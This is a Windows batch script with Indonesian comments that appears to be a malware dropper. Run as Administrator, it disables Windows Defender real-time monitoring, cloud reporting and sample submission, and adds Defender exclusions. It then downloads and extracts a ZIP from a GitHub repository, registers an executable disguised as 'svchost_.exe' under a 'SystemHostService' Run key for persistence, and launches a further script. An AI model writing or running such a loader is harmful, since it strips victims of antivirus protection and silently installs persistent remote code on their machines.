@echo off
:: Wajib dijalankan sebagai Administrator

set "folderPath=C:\ProgramData\AppData"
set "zipName=XMASTERTES.zip"
set "extractFolder=XMASTERTES-main"
set "fullPath=%folderPath%\%extractFolder%"
set "exePath=%fullPath%\svchost_.exe"

:: Buat folder jika belum ada
mkdir "%folderPath%" 2>nul

:: ===== Nonaktifkan Proteksi Windows Defender =====
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -MAPSReporting 0"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
:: Catatan: Tamper Protection tidak bisa dinonaktifkan melalui skrip biasa.

:: Tambahkan folder utama dan hasil ekstrak ke pengecualian Defender
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"

:: ===== Unduh ZIP dari GitHub =====
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"

:: ===== Ekstrak ZIP =====
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"

:: ===== Tambahkan svchost_.exe ke Startup melalui Registry =====
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHostService" /t REG_SZ /d "%exePath%" /f

:: ===== Buka folder dan Jalankan RunScript.bat =====
start "" explorer "%fullPath%"

if exist "%fullPath%\RunScript.bat" (
    start "" "%fullPath%\RunScript.bat"
)

exit
